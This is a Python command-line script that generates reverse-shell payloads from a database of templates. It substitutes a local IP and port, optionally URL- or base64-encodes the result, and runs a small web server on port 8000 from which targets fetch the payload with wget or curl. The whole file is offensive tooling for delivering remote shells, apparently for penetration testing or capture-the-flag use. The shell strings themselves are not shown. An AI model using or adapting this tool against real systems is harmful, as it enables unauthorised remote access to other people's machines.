#!/usr/bin/python3
#This script is used to help quickly generate reverse shells with a given IP
import os,urllib.parse,socket,time,base64,sys
from globe import curse
from ProgMenu.progmenu import MENU
from menuentries import *

PARSER=MENU.parse(True,strict=True)

def main():
	#Retrieve the rshell data from the db
	if PARSER["id"]:
		res=curse.execute("SELECT platform,name,data,req_ip,req_port FROM rshells WHERE uid=?",(PARSER["id"],)).fetchall()[0]
	else:
		res=curse.execute("SELECT platform,name,data,req_ip,req_port FROM rshells WHERE platform=? AND name=?",(PARSER["platform"],PARSER["name"])).fetchall()[0]

	if not res:
		print(f"[|x:main]: No rshells found. Try a different name?")
		exit(3)

	#Check if an IP and PORT are required, and if so make sure ones were provided
	if (res[3] and not PARSER["ip"]) or (res[4] and not PARSER["port"]):
		print(f"""[|x:main]: The \033[1m{res[0]} - {res[1]}\033[0m rshell requires an ip and/or port. Make sure they are provided!""")
		exit(3)

	data=res[2].encode()

	#Prepend a prefix if asked:
	if PARSER["prefix"]:
		data=PARSER["prefix"]+data

	#URL encode the data if the flag was called
	if PARSER["urlencode"]:
		data=urllib.parse.quote_plus(data,safe='^')

	#Replace the ^LOCAL_IP^ and ^LOCAL_PORT^ in the data if ip and port are required
	# data=data.replace("^LOCAL_IP^",f"""\033[94m{PARSER["ip"]}\033[0m""").replace("^LOCAL_PORT^",f"""\033[95m{PARSER["port"]}\033[0m""")
	data=data.replace(b"^LOCAL_IP^",f"""{PARSER["ip"]}""".encode()).replace(b"^LOCAL_PORT^",f"""{PARSER["port"]}""".encode())

	#Base64 encode if the flag was called
	if PARSER["base64encode"]:
		data=base64.b64encode(data).decode()

	#Start a webserver that will serve the payload (for easy transfers to targets)
	if PARSER["web"]:
		print(f"[|x:main]: Starting web server on port 8000...")
		print(f"[|x:main]: The rshell will be served from any endpoint. From the target, use wget or write curl output to a file")

		serv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		serv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		serv.bind(("0.0.0.0",8000))
		serv.listen()

		#Make persistent if asked
		if PARSER["persistent"]:
			print(f"[|x:main]: Looping server...")
			while True:
				webserver(serv,data)
		else:
			print(f"[|x:main]: Closing after first request...")
			webserver(serv,data)
		# time.sleep(3)

	else:
		sys.stdout.buffer.write(data)




def webserver(serv,data):
	'''Handle the webserver'''
	cli,cli_addr=serv.accept()
	print(f"[|x:main]: Connection from: {cli_addr}")

	print(cli.recv(2048))
	cli.send(f"""HTTP/1.1 200 OK\r
Content-Type: application/octet-stream\r
Content-Length: {len(data)}\r
\r\n""".encode())
	cli.send(data.encode() if type(data)!=bytes else data)

	cli.close()

if __name__=="__main__":
	try:
		main()
	except KeyboardInterrupt:
		print(f"\r\033[K",end='')
